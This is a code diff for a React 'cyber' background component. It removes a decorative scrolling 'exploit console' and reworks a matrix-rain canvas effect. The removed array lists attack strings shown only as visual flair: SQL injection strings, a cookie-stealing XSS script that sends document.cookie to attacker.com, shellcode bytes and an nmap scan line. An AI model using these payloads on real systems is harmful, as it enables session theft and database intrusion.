@@ -2,57 +2,7 @@ import { useState, useEffect, useRef } from 'react'
 import { C, FONT, MATRIX_CHARS, HEX_CHARS, BINARY_CHARS } from '../constants'
 import type { Screen } from '../types'
 
-const EXPLOIT_PAYLOADS = [
-  "SELECT * FROM users WHERE id='1' OR '1'='1'",
-  "UNION SELECT null, username, password FROM admin--",
-  "<script>document.location='http://attacker.com/cookie?='+document.cookie</script>",
-  "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50",
-  "GET /cgi-bin/test.cgi?%20HTTP/1.1\\r\\nHost: target",
-  "WAF_BYPASS: X-Originating-IP: 127.0.0.1",
-  "curl -d 'password=admin' -X POST http://localhost:8000/auth",
-  "nmap -sV -p 80,443,8080,8443 -T4 target.domain",
-  "PAYLOAD: <iframe src='javascript:alert(1)'></iframe>",
-  "CRACKING HASH: $2a$12$R9h/cIPz0gi.UR3t3...",
-  "STATUS: EXPLOIT COMPLETED [SESSION: 0x9F82]",
-  "OVERFLOW SLED: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
-  "INJECTING SHELLCODE... DONE",
-  "RECON: CRAWLING INTERNAL ENDPOINTS...",
-  "FOUND: /admin/config.php (403 Forbidden)",
-  "BYPASSING AUTH WITH SQLi... SUCCESS",
-  "EXTRACTING DATABASE TABLES... 14 TABLES FOUND",
-  "CRITICAL: CVE-2024-XXXX EXPLOITED SUCCESSFULLY",
-]
-
-function ExploitConsole() {
-  const doubleList = [...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS]
-  return (
-    <div style={{
-      width: '100%', height: '100%', overflow: 'hidden', position: 'relative',
-      padding: '8px 12px',
-    }}>
-      <div style={{
-        display: 'flex', flexDirection: 'column', gap: 12,
-        animation: 'cyber-scroll-up 24s linear infinite',
-      }}>
-        {doubleList.map((payload, i) => (
-          <div key={i} style={{
-            fontFamily: FONT.mono, fontSize: 8,
-            color: 'rgba(0, 255, 136, 0.75)',
-            whiteSpace: 'pre-wrap',
-            wordBreak: 'break-all',
-            lineHeight: 1.3,
-            textShadow: '0 0 2px rgba(0,255,136,0.3)',
-          }}>
-            <span style={{ color: C.green, marginRight: 4 }}>$</span>
-            {payload}
-          </div>
-        ))}
-      </div>
-    </div>
-  )
-}
-
-function MatrixRainCanvas() {
+function MatrixRainCanvas({ color = '#00d4ff' }: { color?: string }) {
   const canvasRef = useRef<HTMLCanvasElement>(null)
 
   useEffect(() => {
@@ -68,52 +18,75 @@ function MatrixRainCanvas() {
     const ctx = canvas.getContext('2d')
     if (!ctx) return
 
-    const columns = Math.floor(canvas.width / 10)
-    const yPositions = Array(columns).fill(0)
+    const fontSize = 11
+    const columns = Math.floor(canvas.width / 14)
+    
+    const drops = Array.from({ length: columns }, () => ({
+      y: Math.random() * -600,
+      speed: 1.5 + Math.random() * 2.5,
+      history: [] as { char: string; opacity: number }[]
+    }))
 
-    let animationId: number
     const chars = '01010101010101HEX0XVERDICTSQLiXSS<>[]{}/\\'
 
+    let animationId: number
     const draw = () => {
-      ctx.fillStyle = 'rgba(5, 7, 10, 0.08)'
-      ctx.fillRect(0, 0, canvas.width, canvas.height)
+      ctx.clearRect(0, 0, canvas.width, canvas.height)
+      ctx.font = `${fontSize}px monospace`
 
-      ctx.fillStyle = '#00d4ff'
-      ctx.font = '9px monospace'
+      for (let i = 0; i < drops.length; i++) {
+        const drop = drops[i]
+        const x = i * 14
 
-      for (let i = 0; i < yPositions.length; i++) {
-        const char = chars[Math.floor(Math.random() * chars.length)]
-        const x = i * 10
-        const y = yPositions[i]
+        const newChar = chars[Math.floor(Math.random() * chars.length)]
+        drop.history.push({ char: newChar, opacity: 1.0 })
 
-        if (Math.random() > 0.98) {
-          ctx.fillStyle = '#ffffff'
-        } else {
-          ctx.fillStyle = 'rgba(0, 212, 255, 0.8)'
+        if (drop.history.length > 15) {
+          drop.history.shift()
         }
 
-        ctx.fillText(char, x, y)
+        for (let h = 0; h < drop.history.length; h++) {
+          const item = drop.history[h]
+          const y = drop.y - (drop.history.length - 1 - h) * (fontSize + 3)
+          
+          item.opacity = Math.max(0, item.opacity - 0.03)
 
-        if (y > canvas.height && Math.random() > 0.975) {
-          yPositions[i] = 0
-        } else {
-          yPositions[i] += 10
+          if (y > 0 && y < canvas.height) {
+            if (h === drop.history.length - 1) {
+              ctx.fillStyle = '#ffffff'
+              ctx.shadowColor = color
+              ctx.shadowBlur = 8
+            } else {
+              ctx.fillStyle = color === '#00d4ff' 
+                ? `rgba(0, 212, 255, ${item.opacity * 0.5})`
+                : `rgba(0, 255, 136, ${item.opacity * 0.5})`
+              ctx.shadowBlur = 0
+            }
+            ctx.fillText(item.char, x, y)
+          }
+        }
+
+        drop.y += drop.speed
+
+        if (drop.y - drop.history.length * (fontSize + 3) > canvas.height) {
+          drop.y = 0
+          drop.history = []
         }
       }
       animationId = requestAnimationFrame(draw)
     }
 
     animationId = requestAnimationFrame(draw)
-    
     window.addEventListener('resize', resizeCanvas)
     return () => {
       cancelAnimationFrame(animationId)
       window.removeEventListener('resize', resizeCanvas)
     }
-  }, [])
+  }, [color])
 
   return <canvas ref={canvasRef} style={{ display: 'block', width: '100%', height: '100%' }} />
 }
+
 
 function CyberRadar({ isDashboard, reveal }: { isDashboard?: boolean; reveal?: number }) {
   const ro = reveal ?? 1
@@ -313,78 +286,26 @@ export default function Background({ isDashboard, screen }: { isDashboard: boole
         </div>
       ))}
 
-      {/* Left Hacker Console */}
+      {/* Left Full-Height Matrix Rain */}
       <div className="hud-left" style={{
-        position: 'fixed', left: 32, top: 120, bottom: 120, width: 190,
-        flexDirection: 'column',
-        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
+        position: 'fixed', left: 0, top: 0, bottom: 0, width: 220,
+        pointerEvents: 'none', zIndex: 1, opacity: 0.28 * reveal,
         transition: 'opacity 1000ms ease-out',
-        background: 'rgba(5, 7, 10, 0.85)',
-        border: `1px solid rgba(0, 255, 136, 0.25)`,
-        borderRadius: 6,
-        boxShadow: '0 0 15px rgba(0, 255, 136, 0.05), inset 0 0 10px rgba(0, 255, 136, 0.05)',
-        overflow: 'hidden',
+        maskImage: 'linear-gradient(to right, rgba(0,0,0,1) 30%, transparent)',
+        WebkitMaskImage: 'linear-gradient(to right, rgba(0,0,0,1) 30%, transparent)',
       }}>
-        <div style={{
-          height: 24, background: 'rgba(0, 255, 136, 0.1)',
-          borderBottom: `1px solid rgba(0, 255, 136, 0.2)`,
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          padding: '0 10px',
-        }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.green, fontWeight: 700, letterSpacing: '0.06em' }}>
-            [EXPLOIT_STREAM]
-          </span>
-          <div style={{ display: 'flex', gap: 3 }}>
-            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green }} />
-            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green, opacity: 0.5 }} />
-          </div>
-        </div>
-        <div style={{ flex: 1, position: 'relative', overflow: 'hidden' }}>
-          <ExploitConsole />
-          <div style={{
-            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
-            background: 'linear-gradient(to bottom, transparent, rgba(0, 255, 136, 0.08) 50%, transparent)',
-            animation: 'scan-line 4s linear infinite',
-            pointerEvents: 'none',
-          }} />
-        </div>
+        <MatrixRainCanvas color={C.green} />
       </div>
 
-      {/* Right Hacker Console */}
+      {/* Right Full-Height Matrix Rain */}
       <div className="hud-right" style={{
-        position: 'fixed', right: 32, top: 120, bottom: 120, width: 190,
-        flexDirection: 'column',
-        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
+        position: 'fixed', right: 0, top: 0, bottom: 0, width: 220,
+        pointerEvents: 'none', zIndex: 1, opacity: 0.28 * reveal,
         transition: 'opacity 1000ms ease-out',
-        background: 'rgba(5, 7, 10, 0.85)',
-        border: `1px solid rgba(0, 212, 255, 0.25)`,
-        borderRadius: 6,
-        boxShadow: '0 0 15px rgba(0, 212, 255, 0.05), inset 0 0 10px rgba(0, 212, 255, 0.05)',
-        overflow: 'hidden',
+        maskImage: 'linear-gradient(to left, rgba(0,0,0,1) 30%, transparent)',
+        WebkitMaskImage: 'linear-gradient(to left, rgba(0,0,0,1) 30%, transparent)',
       }}>
-        <div style={{
-          height: 24, background: 'rgba(0, 212, 255, 0.1)',
-          borderBottom: `1px solid rgba(0, 212, 255, 0.2)`,
-          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
-          padding: '0 10px',
-        }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.cyan, fontWeight: 700, letterSpacing: '0.06em' }}>
-            [MATRIX_RAIN]
-          </span>
-          <div style={{ display: 'flex', gap: 3 }}>
-            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan }} />
-            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan, opacity: 0.5 }} />
-          </div>
-        </div>
-        <div style={{ flex: 1, position: 'relative', overflow: 'hidden', background: '#05070a' }}>
-          <MatrixRainCanvas />
-          <div style={{
-            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
-            background: 'linear-gradient(to bottom, transparent, rgba(0, 212, 255, 0.08) 50%, transparent)',
-            animation: 'scan-line 5s linear infinite',
-            pointerEvents: 'none',
-          }} />
-        </div>
+        <MatrixRainCanvas color={C.cyan} />
       </div>
     </div>
   )
